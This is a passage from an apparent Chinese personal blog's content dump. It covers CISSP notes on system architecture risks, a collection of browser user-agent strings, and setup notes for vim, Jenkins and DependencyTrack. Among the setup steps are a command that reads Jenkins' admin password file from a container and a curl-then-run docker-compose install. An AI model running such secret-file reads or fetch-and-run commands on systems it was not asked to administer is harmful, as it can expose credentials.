boot）功能，对启动进程中的每个元素进行哈希计算。哈希计算由可信平台模块（TPM）执行并将结果记录在该模块中。测量启动不会干扰和中断启动进程，只是记录启动过程中涉及每个元素的哈希ID。</p><h1 id="9-3基于客户端的系统"><a href="#9-3基于客户端的系统" class="headerlink" title="9.3基于客户端的系统"></a>9.3基于客户端的系统</h1><p>客户端攻击是指会对客户端造成伤害的任何攻击，该类攻击是以客户端为目标。</p><p>常见的风险：</p><p>1、通过恶意网址将恶意移动代码（applet）传输给客户端上运行的脆弱浏览器。</p><p>不局限于HTTP协议，可以发生在任何通信协议上。</p><p>2、本地缓存中毒的风险。</p><h2 id="9-3-1移动代码-applet"><a href="#9-3-1移动代码-applet" class="headerlink" title="9.3.1移动代码 applet"></a>9.3.1移动代码 applet</h2><p>applet 是服务器发送给客户端用来执行某些操作的代码对象。</p><p>常见的 applet ：Java applet（甲骨文）、Active X（微软）和flash</p><p>嵌入式代码javascript存在同样的风险。</p><p>解决方案：</p><p>1、实时更新浏览器（客户端）</p><p>2、执行javascript子集（如 ADsafe、Secure ECMAScript或Caja）（服务端）</p><p>3、落实内容安全策略，执行同源策略</p><p>4、Web应用防火墙（WAF）和下一代防火墙（NGFW）</p><p>5、插件、浏览器辅助对象（BHO）和扩展来降低javascript风险，例如：用于 Mozilla Firefox的 NoScript、用于（基于chromium的）Chrome和Edge的UBlock Origin </p><h2 id="9-3-2本地缓存"><a href="#9-3-2本地缓存" class="headerlink" title="9.3.2本地缓存"></a>9.3.2本地缓存</h2><p>常见本地缓存有 DNS缓存、ARP缓存和临时互联网文件。</p><p>临时互联网文件（temporary Internet file）或互联网文件缓存（Internet files cache）是从互联网下载的文件临时存储，通常由客户端使用程序浏览器保存，以供当前和将来使用。</p><p>风险点：</p><p>1、DOM XSS 可以访问本地缓存文件并用它们来执行恶意代码或泄漏数据。</p><p>2、移动代码脚本攻击给缓存植入虚假内容。</p><p>解决方案：</p><p>1、配置缓存，使其只在短时间内保留文件，从而最大限度地缩小缓存。</p><p>2、禁用预加载内容。</p><p>3、配置浏览器在退出时删除所有cookie和缓存、配置自动清除程序，按计划或者在目标程序关闭时清楚临时互联网文件。</p><h1 id="9-4基于服务器端的系统"><a href="#9-4基于服务器端的系统" class="headerlink" title="9.4基于服务器端的系统"></a>9.4基于服务器端的系统</h1><p>关注要点：数据流控制（data flow control）的问题。</p><p>数据流：数据在进程之间、设备之间、网络之间和通信信道之间的流转。</p><p>数据流管理要点：</p><p>1、确保最小延迟和时延高效传输</p><p>2、确保通过加密实现哈希计算和保密性实现可靠的吞吐量</p><p>3、确保接收系统不会因通信流过载。</p><p>数据流管理设备：</p><p>1、路由器&#x2F;交换机等联网设备</p><p>2、网络应用和服务</p><h2 id="9-4-1大规模并行数据系统"><a href="#9-4-1大规模并行数据系统" class="headerlink" title="9.4.1大规模并行数据系统"></a>9.4.1大规模并行数据系统</h2><p>并行数据系统（parallel data system）或并行计算（parallel computing）是一种同时执行大量计算的计算系统。</p><p>通过把大型任务划分为较小的元素，每个子元素分配给不同的处理子系统并行计算。</p><p>对于大规模并行数据系统（large-sacle parallel data system）需要关注性能、功耗和可靠性&#x2F;稳定性问题。</p><p>多处理或并行处理领域分支：</p><p>1、对称多处理（SMP）</p><p>单台计算机的多个处理器被单一操作系统同等地对待和控制的场景称为对称多处理（symmetric multiprocessing，SMP）。</p><p>各个处理器共享单一公共操作系统、单一公共数据总线和内存资源。</p><p>2、非对称多处理（AMP）</p><p>单台计算机的多个处理器彼此独立工作，每个处理器有自己的操作系统、任务指令集以及专用的数据总线和内存资源的场景称为非对称多处理（asymmetric multiprocessing，AMP）。</p><p>AMP存在变体叫大规模并行处理（massive parallel processing，MPP），大量AMP系统被链接在一起，多个进程共同处理一项主任务。</p><p>SMP系统擅长以极高速度处理简单操作。</p><p>MPP系统擅长处理极其庞大、复杂且计算极其密集的任务。</p><h2 id="9-4-2网格系统"><a href="#9-4-2网格系统" class="headerlink" title="9.4.2网格系统"></a>9.4.2网格系统</h2><p>网格计算（grid computing）是一种并行分布式处理形式，对大量处理节点进行松散的分组，使其共同去实现一个特定处理目标。</p><p>网格成员可以随机进入和离开网格。</p><p>安全问题：</p><p>1、每个工作包的内容都有暴露给外界的可能，许多网格计算项目对全世界开放。</p><p>网格项目不太可能保守秘密，因此不适用于隐私、保密或专有数据。</p><p>2、存在中央网格服务器被入侵，攻击网格成员或欺骗网格成员执行非网格社区预期目的的恶意操作。</p><h2 id="9-4-3对等系统"><a href="#9-4-3对等系统" class="headerlink" title="9.4.3对等系统"></a>9.4.3对等系统</h2><p>对等网络（peer-to-peer，P2P）技术是在伙伴之间共享任务和工作负载的联网和分布式应用解决方案。</p><p>与网格计算区别：P2P没有中央管理系统，通常实时提供服务，不是能力计算的集合。</p><p>常见P2P实例：</p><p>1、VoIP服务</p><p>2、BitTorrent（用于数据&#x2F;文件分发）</p><p>3、简化音频&#x2F;音乐分发的工具</p><p>安全问题：</p><p>1、版权问题</p><p>2、窃听分布式内容</p><p>3、服务耗尽可用带宽的可能性</p><h1 id="9-5工业控制系统"><a href="#9-5工业控制系统" class="headerlink" title="9.5工业控制系统"></a>9.5工业控制系统</h1><p>工业控制系统（industrial control system，ICS）是一种控制工业流程和机器的计算机管理设备，也叫操作技术（operational technology，OT）。</p><p>存在多种形式：</p><p>1、分布式控制系统（distributed control system，DCS）</p><p>2、可编程逻辑控制器（programmable logic controller，PLC）</p><p>3、监测控制和数据采集（supervisory control and data acquisition，SCADA）系统</p><h1 id="9-6分布式系统"><a href="#9-6分布式系统" class="headerlink" title="9.6分布式系统"></a>9.6分布式系统</h1><h1 id="9-7高性能系统"><a href="#9-7高性能系统" class="headerlink" title="9.7高性能系统"></a>9.7高性能系统</h1><h1 id="9-8物联网"><a href="#9-8物联网" class="headerlink" title="9.8物联网"></a>9.8物联网</h1><h1 id="9-9边缘和雾计算"><a href="#9-9边缘和雾计算" class="headerlink" title="9.9边缘和雾计算"></a>9.9边缘和雾计算</h1><h1 id="9-10嵌入式设备和信息物理融合系统"><a href="#9-10嵌入式设备和信息物理融合系统" class="headerlink" title="9.10嵌入式设备和信息物理融合系统"></a>9.10嵌入式设备和信息物理融合系统</h1><h2 id="9-10-1静态系统"><a href="#9-10-1静态系统" class="headerlink" title="9.10.1静态系统"></a>9.10.1静态系统</h2><h2 id="9-10-2可联网设备"><a href="#9-10-2可联网设备" class="headerlink" title="9.10.2可联网设备"></a>9.10.2可联网设备</h2><h2 id="9-10-3信息物理融合系统"><a href="#9-10-3信息物理融合系统" class="headerlink" title="9.10.3信息物理融合系统"></a>9.10.3信息物理融合系统</h2><h2 id="9-10-4与嵌入式和静态系统相关的元素"><a href="#9-10-4与嵌入式和静态系统相关的元素" class="headerlink" title="9.10.4与嵌入式和静态系统相关的元素"></a>9.10.4与嵌入式和静态系统相关的元素</h2><h2 id="9-10-5嵌入式和静态系统的安全问题"><a href="#9-10-5嵌入式和静态系统的安全问题" class="headerlink" title="9.10.5嵌入式和静态系统的安全问题"></a>9.10.5嵌入式和静态系统的安全问题</h2><h1 id="9-11专用设备"><a href="#9-11专用设备" class="headerlink" title="9.11专用设备"></a>9.11专用设备</h1><h1 id="9-12微服务"><a href="#9-12微服务" class="headerlink" title="9.12微服务"></a>9.12微服务</h1><h1 id="9-13基础设施即代码"><a href="#9-13基础设施即代码" class="headerlink" title="9.13基础设施即代码"></a>9.13基础设施即代码</h1><h1 id="9-14虚拟化系统"><a href="#9-14虚拟化系统" class="headerlink" title="9.14虚拟化系统"></a>9.14虚拟化系统</h1><h2 id="9-14-1虚拟软件"><a href="#9-14-1虚拟软件" class="headerlink" title="9.14.1虚拟软件"></a>9.14.1虚拟软件</h2><h2 id="9-14-2虚拟网络"><a href="#9-14-2虚拟网络" class="headerlink" title="9.14.2虚拟网络"></a>9.14.2虚拟网络</h2><h2 id="9-14-3软件定义一切"><a href="#9-14-3软件定义一切" class="headerlink" title="9.14.3软件定义一切"></a>9.14.3软件定义一切</h2><h2 id="9-14-4虚拟化的安全管理"><a href="#9-14-4虚拟化的安全管理" class="headerlink" title="9.14.4虚拟化的安全管理"></a>9.14.4虚拟化的安全管理</h2><h1 id="9-15容器化"><a href="#9-15容器化" class="headerlink" title="9.15容器化"></a>9.15容器化</h1><h1 id="9-16无服务器架构"><a href="#9-16无服务器架构" class="headerlink" title="9.16无服务器架构"></a>9.16无服务器架构</h1><h1 id="9-17移动设备"><a href="#9-17移动设备" class="headerlink" title="9.17移动设备"></a>9.17移动设备</h1><h2 id="9-17-1移动设备的安全性能"><a href="#9-17-1移动设备的安全性能" class="headerlink" title="9.17.1移动设备的安全性能"></a>9.17.1移动设备的安全性能</h2><h2 id="9-17-2移动设备的部署策略"><a href="#9-17-2移动设备的部署策略" class="headerlink" title="9.17.2移动设备的部署策略"></a>9.17.2移动设备的部署策略</h2><h1 id="9-18基本安全保护机制"><a href="#9-18基本安全保护机制" class="headerlink" title="9.18基本安全保护机制"></a>9.18基本安全保护机制</h1><h2 id="9-18-1进程隔离"><a href="#9-18-1进程隔离" class="headerlink" title="9.18.1进程隔离"></a>9.18.1进程隔离</h2><h2 id="9-18-2硬件分隔"><a href="#9-18-2硬件分隔" class="headerlink" title="9.18.2硬件分隔"></a>9.18.2硬件分隔</h2><h2 id="9-18-3系统安全策略"><a href="#9-18-3系统安全策略" class="headerlink" title="9.18.3系统安全策略"></a>9.18.3系统安全策略</h2><h1 id="9-19常见的安全架构缺陷和问题"><a href="#9-19常见的安全架构缺陷和问题" class="headerlink" title="9.19常见的安全架构缺陷和问题"></a>9.19常见的安全架构缺陷和问题</h1><h2 id="9-19-1隐蔽通道"><a href="#9-19-1隐蔽通道" class="headerlink" title="9.19.1隐蔽通道"></a>9.19.1隐蔽通道</h2><h2 id="9-19-2基于设计或编码缺陷的攻击"><a href="#9-19-2基于设计或编码缺陷的攻击" class="headerlink" title="9.19.2基于设计或编码缺陷的攻击"></a>9.19.2基于设计或编码缺陷的攻击</h2><h2 id="9-19-3rootkit"><a href="#9-19-3rootkit" class="headerlink" title="9.19.3rootkit"></a>9.19.3rootkit</h2><h2 id="9-19-4增量攻击"><a href="#9-19-4增量攻击" class="headerlink" title="9.19.4增量攻击"></a>9.19.4增量攻击</h2><h1 id="9-20本章总结"><a href="#9-20本章总结" class="headerlink" title="9.20本章总结"></a>9.20本章总结</h1><h1 id="9-21考试要点"><a href="#9-21考试要点" class="headerlink" title="9.21考试要点"></a>9.21考试要点</h1><h2 id="了解共担责任"><a href="#了解共担责任" class="headerlink" title="了解共担责任"></a>了解共担责任</h2><h2 id="多任务处理、多核、多重处理、多程序设计和多线程之间的差异"><a href="#多任务处理、多核、多重处理、多程序设计和多线程之间的差异" class="headerlink" title="多任务处理、多核、多重处理、多程序设计和多线程之间的差异"></a>多任务处理、多核、多重处理、多程序设计和多线程之间的差异</h2><h2 id="了解保护环概念"><a href="#了解保护环概念" class="headerlink" title="了解保护环概念"></a>了解保护环概念</h2><h2 id="了解进程状态"><a href="#了解进程状态" class="headerlink" title="了解进程状态"></a>了解进程状态</h2><h2 id="描述存储器不同类型"><a href="#描述存储器不同类型" class="headerlink" title="描述存储器不同类型"></a>描述存储器不同类型</h2><h2 id="了解存储器组件相关安全问题"><a href="#了解存储器组件相关安全问题" class="headerlink" title="了解存储器组件相关安全问题"></a>了解存储器组件相关安全问题</h2><h2 id="了解内存寻址概念"><a href="#了解内存寻址概念" class="headerlink" title="了解内存寻址概念"></a>了解内存寻址概念</h2><h2 id="描述计算机所用存储设备不同特征"><a href="#描述计算机所用存储设备不同特征" class="headerlink" title="描述计算机所用存储设备不同特征"></a>描述计算机所用存储设备不同特征</h2><h2 id="了解存储设备类型的变体"><a href="#了解存储设备类型的变体" class="headerlink" title="了解存储设备类型的变体"></a>了解存储设备类型的变体</h2><h2 id="了解辅助存储设备的安全问题"><a href="#了解辅助存储设备的安全问题" class="headerlink" title="了解辅助存储设备的安全问题"></a>了解辅助存储设备的安全问题</h2><h2 id="了解发射安全"><a href="#了解发射安全" class="headerlink" title="了解发射安全"></a>了解发射安全</h2><h2 id="了解输入和输出设备可能带来的安全风险"><a href="#了解输入和输出设备可能带来的安全风险" class="headerlink" title="了解输入和输出设备可能带来的安全风险"></a>了解输入和输出设备可能带来的安全风险</h2><h2 id="了解固件的用途"><a href="#了解固件的用途" class="headerlink" title="了解固件的用途"></a>了解固件的用途</h2><h2 id="了解javascript的问题"><a href="#了解javascript的问题" class="headerlink" title="了解javascript的问题"></a>了解javascript的问题</h2><h2 id="了解大规模并行数据系统"><a href="#了解大规模并行数据系统" class="headerlink" title="了解大规模并行数据系统"></a>了解大规模并行数据系统</h2><h2 id="要能定义ISC"><a href="#要能定义ISC" class="headerlink" title="要能定义ISC"></a>要能定义ISC</h2><h2 id="了解分布式系统"><a href="#了解分布式系统" class="headerlink" title="了解分布式系统"></a>了解分布式系统</h2><h2 id="了解区块链"><a href="#了解区块链" class="headerlink" title="了解区块链"></a>了解区块链</h2><h2 id="了解数据主权"><a href="#了解数据主权" class="headerlink" title="了解数据主权"></a>了解数据主权</h2><h2 id="了解智能设备"><a href="#了解智能设备" class="headerlink" title="了解智能设备"></a>了解智能设备</h2><h2 id="要能定义物联网"><a href="#要能定义物联网" class="headerlink" title="要能定义物联网"></a>要能定义物联网</h2><h2 id="要能定义工业物联网"><a href="#要能定义工业物联网" class="headerlink" title="要能定义工业物联网"></a>要能定义工业物联网</h2><h2 id="了解专用设备"><a href="#了解专用设备" class="headerlink" title="了解专用设备"></a>了解专用设备</h2><h2 id="要能定义SOA"><a href="#要能定义SOA" class="headerlink" title="要能定义SOA"></a>要能定义SOA</h2><h2 id="了解微服务"><a href="#了解微服务" class="headerlink" title="了解微服务"></a>了解微服务</h2><h2 id="要能定义IaC"><a href="#要能定义IaC" class="headerlink" title="要能定义IaC"></a>要能定义IaC</h2><h2 id="了解管理程序"><a href="#了解管理程序" class="headerlink" title="了解管理程序"></a>了解管理程序</h2><h2 id="了解-I-型管理程序"><a href="#了解-I-型管理程序" class="headerlink" title="了解 I 型管理程序"></a>了解 I 型管理程序</h2><h2 id="了解-II-型管理程序"><a href="#了解-II-型管理程序" class="headerlink" title="了解 II 型管理程序"></a>了解 II 型管理程序</h2><h2 id="了解虚拟机逃逸"><a href="#了解虚拟机逃逸" class="headerlink" title="了解虚拟机逃逸"></a>了解虚拟机逃逸</h2><h2 id="了解虚拟软件"><a href="#了解虚拟软件" class="headerlink" title="了解虚拟软件"></a>了解虚拟软件</h2><h2 id="了解SDx"><a href="#了解SDx" class="headerlink" title="了解SDx"></a>了解SDx</h2><h2 id="了解VDI和VMI"><a href="#了解VDI和VMI" class="headerlink" title="了解VDI和VMI"></a>了解VDI和VMI</h2><h2 id="了解SDV"><a href="#了解SDV" class="headerlink" title="了解SDV"></a>了解SDV</h2><h2 id="了解SDDC"><a href="#了解SDDC" class="headerlink" title="了解SDDC"></a>了解SDDC</h2><h2 id="了解XaaS"><a href="#了解XaaS" class="headerlink" title="了解XaaS"></a>了解XaaS</h2><h2 id="了解虚拟化的一些安全问题"><a href="#了解虚拟化的一些安全问题" class="headerlink" title="了解虚拟化的一些安全问题"></a>了解虚拟化的一些安全问题</h2><h2 id="了解容器化"><a href="#了解容器化" class="headerlink" title="了解容器化"></a>了解容器化</h2><h2 id="了解无服务器架构"><a href="#了解无服务器架构" class="headerlink" title="了解无服务器架构"></a>了解无服务器架构</h2><h2 id="了解嵌入式系统"><a href="#了解嵌入式系统" class="headerlink" title="了解嵌入式系统"></a>了解嵌入式系统</h2><h2 id="了解微控制器"><a href="#了解微控制器" class="headerlink" title="了解微控制器"></a>了解微控制器</h2><h2 id="了解静态系统-环境"><a href="#了解静态系统-环境" class="headerlink" title="了解静态系统&#x2F;环境"></a>了解静态系统&#x2F;环境</h2><h2 id="了解可联网设备"><a href="#了解可联网设备" class="headerlink" title="了解可联网设备"></a>了解可联网设备</h2><h2 id="了解信息物理融合系统"><a href="#了解信息物理融合系统" class="headerlink" title="了解信息物理融合系统"></a>了解信息物理融合系统</h2><h2 id="了解嵌入式系统和静态环境的安全问题"><a href="#了解嵌入式系统和静态环境的安全问题" class="headerlink" title="了解嵌入式系统和静态环境的安全问题"></a>了解嵌入式系统和静态环境的安全问题</h2><h2 id="了解HPC系统"><a href="#了解HPC系统" class="headerlink" title="了解HPC系统"></a>了解HPC系统</h2><h2 id="了解RTOS"><a href="#了解RTOS" class="headerlink" title="了解RTOS"></a>了解RTOS</h2><h2 id="了解边缘计算"><a href="#了解边缘计算" class="headerlink" title="了解边缘计算"></a>了解边缘计算</h2><h2 id="了解雾计算"><a href="#了解雾计算" class="headerlink" title="了解雾计算"></a>了解雾计算</h2><h2 id="了解移动设备安全"><a href="#了解移动设备安全" class="headerlink" title="了解移动设备安全"></a>了解移动设备安全</h2><h2 id="了解移动设备部署策略"><a href="#了解移动设备部署策略" class="headerlink" title="了解移动设备部署策略"></a>了解移动设备部署策略</h2><h2 id="了解移动设备部署策略的细节"><a href="#了解移动设备部署策略的细节" class="headerlink" title="了解移动设备部署策略的细节"></a>了解移动设备部署策略的细节</h2><h2 id="了解进程隔离"><a href="#了解进程隔离" class="headerlink" title="了解进程隔离"></a>了解进程隔离</h2><h2 id="了解硬件分隔"><a href="#了解硬件分隔" class="headerlink" title="了解硬件分隔"></a>了解硬件分隔</h2><h2 id="了解系统安全策略的重要性"><a href="#了解系统安全策略的重要性" class="headerlink" title="了解系统安全策略的重要性"></a>了解系统安全策略的重要性</h2><p>系统安全策略作用是告知和指导特定系统的设计、开发、实现、测试和维护。</p><p>系统安全策略需要紧紧围绕具体执行方案展开。</p><h2 id="要能说明什么是隐蔽通道"><a href="#要能说明什么是隐蔽通道" class="headerlink" title="要能说明什么是隐蔽通道"></a>要能说明什么是隐蔽通道</h2><p>隐蔽通道是指在不常被通信使用的路径上传递信息的一种方法。</p><p>隐蔽通道的使用提供了一种违反、绕过或避开安全策略且不被检测到的手段。</p><p>隐蔽通道的基本类型：</p><p>1、隐蔽时序通道</p><p>2、隐蔽存储通道</p><h2 id="了解设计和编码缺陷产生的漏洞"><a href="#了解设计和编码缺陷产生的漏洞" class="headerlink" title="了解设计和编码缺陷产生的漏洞"></a>了解设计和编码缺陷产生的漏洞</h2><p>编码实践不当和安全考虑缺乏是系统架构漏洞常见的来源或原因。</p><p>糟糕的设计、有问题的执行规程、不恰当或不充分的测试、故意的设计决策（代码中内置的特殊入口点未被移除，例如：用于绕过访问控制、登录或其他安全检查， 通常在开发过程中添加到代码中）都有可能带来风险和攻击。</p><h2 id="了解rootkit"><a href="#了解rootkit" class="headerlink" title="了解rootkit"></a>了解rootkit</h2><p>rootkit是嵌入操作系统的一种恶意软件。</p><p>这个词是生根概念和一种黑客实用工具包的衍生物。</p><p>生根是指获得对一个系统的整体或全由控钊。</p><h2 id="了解增量攻击"><a href="#了解增量攻击" class="headerlink" title="了解增量攻击"></a>了解增量攻击</h2><p>有些形式的攻击以缓慢、渐进的方式发生，而不是通过明显或可识别的尝试来危害系统的安全性和完整性。</p><p>增量攻击的两种形式：</p><p>1、数据欺骗</p><p>2、萨拉米香肠攻击</p>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>seccert</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>seccert</tag>
      
      <tag>cissp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>UA_Collect</title>
    <link href="/2025/01/26/security/secattack/messageCollect/UA_Collect/"/>
    <url>/2025/01/26/security/secattack/messageCollect/UA_Collect/</url>
    
    <content type="html"><![CDATA[<p>荣耀30Pro鸿蒙4.2微信手机端UA</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Mozilla</span>/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Linux; Android <span class="hljs-number">12</span>; EBG-AN00 Build/HUAWEIEBG-AN00; wv) AppleWebKit/<span class="hljs-number">537</span>.<span class="hljs-number">36</span> (KHTML, like Gecko) Version/<span class="hljs-number">4</span>.<span class="hljs-number">0</span> Chrome/<span class="hljs-number">130</span>.<span class="hljs-number">0</span>.<span class="hljs-number">6723</span>.<span class="hljs-number">103</span> Mobile Safari/<span class="hljs-number">537</span>.<span class="hljs-number">36</span> XWEB/<span class="hljs-number">1300333</span> MMWEBSDK/<span class="hljs-number">20241202</span> MMWEBID/<span class="hljs-number">5893</span> MicroMessenger/<span class="hljs-number">8.0.56.280</span>0(<span class="hljs-number">0</span>x28003851) WeChat/arm64 Weixin NetType/<span class="hljs-number">5</span>G Language/zh_CN ABI/arm64<br></code></pre></td></tr></table></figure><p>荣耀30Pro鸿蒙4.2Edge手机客户端UA</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Mozilla</span>/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Linux; Android <span class="hljs-number">10</span>; K) AppleWebKit/<span class="hljs-number">537</span>.<span class="hljs-number">36</span> (KHTML, like Gecko) Chrome/<span class="hljs-number">131.0.0.0</span> Mobile Safari/<span class="hljs-number">537</span>.<span class="hljs-number">36</span> EdgA/<span class="hljs-number">131.0.0.0</span><br></code></pre></td></tr></table></figure><p>荣耀30Pro鸿蒙4.2夸克手机客户端UA</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Mozilla</span>/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Linux; U; Android <span class="hljs-number">12</span>; zh-Hans-CN; EBG-AN00 Build/HUAWEIEBG-AN00) AppleWebKit/<span class="hljs-number">537</span>.<span class="hljs-number">36</span> (KHTML, like Gecko) Version/<span class="hljs-number">4</span>.<span class="hljs-number">0</span> Chrome/<span class="hljs-number">100</span>.<span class="hljs-number">0</span>.<span class="hljs-number">4896</span>.<span class="hljs-number">58</span> Quark/<span class="hljs-number">7.6.5.720</span> Mobile Safari/<span class="hljs-number">537</span>.<span class="hljs-number">36</span><br></code></pre></td></tr></table></figure><p>荣耀30Pro鸿蒙4.2必应手机客户端UA</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Mozilla</span>/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Linux; Android <span class="hljs-number">12</span>; EBG-AN00 Build/HUAWEIEBG-AN00; ) AppleWebKit/<span class="hljs-number">537</span>.<span class="hljs-number">36</span> (KHTML, like Gecko) Version/<span class="hljs-number">4</span>.<span class="hljs-number">0</span> Chrome/<span class="hljs-number">114</span>.<span class="hljs-number">0</span>.<span class="hljs-number">5735</span>.<span class="hljs-number">196</span> Mobile Safari/<span class="hljs-number">537</span>.<span class="hljs-number">36</span><br></code></pre></td></tr></table></figure><p>荣耀30Pro鸿蒙4.2自带华为浏览器15.0.9.300 UA</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Mozilla</span>/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Linux; Android <span class="hljs-number">12</span>; HarmonyOS; EBG-AN00; HMSCore <span class="hljs-number">6.15.0.302</span>) AppleWebKit/<span class="hljs-number">537</span>.<span class="hljs-number">36</span> (KHTML, like Gecko) Chrome/<span class="hljs-number">114</span>.<span class="hljs-number">0</span>.<span class="hljs-number">5735</span>.<span class="hljs-number">196</span> HuaweiBrowser/<span class="hljs-number">15.0.9.300</span> Mobile Safari/<span class="hljs-number">537</span>.<span class="hljs-number">36</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>secattack</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>secattack</tag>
      
      <tag>messageCollect</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>dlp</title>
    <link href="/2025/01/21/security/itsec/dlp/"/>
    <url>/2025/01/21/security/itsec/dlp/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="DLP分类"><a href="#DLP分类" class="headerlink" title="DLP分类"></a>DLP分类</h1><h2 id="终端DLP"><a href="#终端DLP" class="headerlink" title="终端DLP"></a>终端DLP</h2><h2 id="网络DLP"><a href="#网络DLP" class="headerlink" title="网络DLP"></a>网络DLP</h2>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>itsec</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>itsec</tag>
      
      <tag>dlp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vim_base</title>
    <link href="/2025/01/15/yunwei/applications/vim_base/"/>
    <url>/2025/01/15/yunwei/applications/vim_base/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="快捷键"><a href="#快捷键" class="headerlink" title="快捷键"></a>快捷键</h1><h2 id="回到行首0"><a href="#回到行首0" class="headerlink" title="回到行首0"></a>回到行首0</h2><p>普通模式下，按esc回到普通模式</p><p>按下 <code>0</code> 键，光标会移到当前行的第一个字符，无论该字符是否为空</p><h3 id="回到行首第一个非空字字符"><a href="#回到行首第一个非空字字符" class="headerlink" title="回到行首第一个非空字字符^"></a>回到行首第一个非空字字符^</h3><p>普通模式下，按esc回到普通模式</p><p>按下 <code>^</code> 键，光标会跳过行首的空白字符，移到第一个非空字符处</p>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>applications</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>applications</tag>
      
      <tag>vim</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>jenkins_base</title>
    <link href="/2025/01/14/yunwei/applications/jenkins/jenkins_base/"/>
    <url>/2025/01/14/yunwei/applications/jenkins/jenkins_base/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="docker-部署"><a href="#docker-部署" class="headerlink" title="docker 部署"></a>docker 部署</h2><h3 id="下载最新镜像"><a href="#下载最新镜像" class="headerlink" title="下载最新镜像"></a>下载最新镜像</h3><p>docker pull jenkins&#x2F;jenkins</p><h3 id="启动容器"><a href="#启动容器" class="headerlink" title="启动容器"></a>启动容器</h3><p>docker run -d -p 8080:8080 -p 50000:50000 –name jenkins –restart&#x3D;on-failure jenkins&#x2F;jenkins</p><h3 id="查看默认密码"><a href="#查看默认密码" class="headerlink" title="查看默认密码"></a>查看默认密码</h3><p>docker exec -it jenkins cat &#x2F;var&#x2F;jenkins_home&#x2F;secrets&#x2F;initialAdminPassword</p>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>applications</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>applications</tag>
      
      <tag>jenkins</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>devsecops_sca</title>
    <link href="/2025/01/13/security/codesec/devsecops_sca/"/>
    <url>/2025/01/13/security/codesec/devsecops_sca/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="SCA概念"><a href="#SCA概念" class="headerlink" title="SCA概念"></a>SCA概念</h1><p>Software Composition Analysis <strong>软件成分分析</strong></p><h1 id="SCA原理"><a href="#SCA原理" class="headerlink" title="SCA原理"></a>SCA原理</h1><p><strong>分析源码提取项目依赖的第三方组件及其版本、许可证</strong>等信息，生成软件物料清单（SBOM，Software Bill-of-Materials），根据SBOM分析项目是否使用了存在已知漏洞的组件，后期其它组件爆出漏洞时也可根据SBOM快速排查受影响项目。</p><h1 id="开源工具"><a href="#开源工具" class="headerlink" title="开源工具"></a>开源工具</h1><h2 id="DependencyCheck"><a href="#DependencyCheck" class="headerlink" title="DependencyCheck"></a>DependencyCheck</h2><h2 id="DependencyTrack"><a href="#DependencyTrack" class="headerlink" title="DependencyTrack"></a>DependencyTrack</h2><h3 id="DependencyTrack简介"><a href="#DependencyTrack简介" class="headerlink" title="DependencyTrack简介"></a>DependencyTrack简介</h3><p>Dependency-Track 是一个智能组件分析平台，使组织能够识别和降低软件供应链中的风险。</p><p>支持多个情报源，包括国家漏洞数据库 （NVD）、Sonatype OSS 索引、GitHub Advisories、Snyk、OSV 和来自基于风险的安全的 VulnDB，发现易受攻击的组件</p><h3 id="DependencyTrack原理"><a href="#DependencyTrack原理" class="headerlink" title="DependencyTrack原理"></a>DependencyTrack原理</h3><p>获取SBOM</p><p><img src="/image-20250113190710639.png" alt="image-20250113190710639"></p><h3 id="DependencyTrack部署"><a href="#DependencyTrack部署" class="headerlink" title="DependencyTrack部署"></a>DependencyTrack部署</h3><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">curl</span> -LO https://dependencytrack.org/docker-compose.yml<br>docker-compose up -d<br></code></pre></td></tr></table></figure><h4 id="默认端口8080"><a href="#默认端口8080" class="headerlink" title="默认端口8080"></a>默认端口8080</h4><h4 id="默认账号密码"><a href="#默认账号密码" class="headerlink" title="默认账号密码"></a>默认账号密码</h4><p>admin&#x2F;admin</p><p>初次部署，会后台下载 相关 漏洞库</p><h4 id="error-部署后登录不成功"><a href="#error-部署后登录不成功" class="headerlink" title="error-部署后登录不成功"></a>error-部署后登录不成功</h4><p><strong>现象</strong></p><p>使用默认密码登录后，不会跳转，存在如下请求</p><p><img src="/image-20250115090958288.png" alt="image-20250115090958288"></p><p><strong>解决方案</strong></p><p>修改 docker-compose 文件</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span 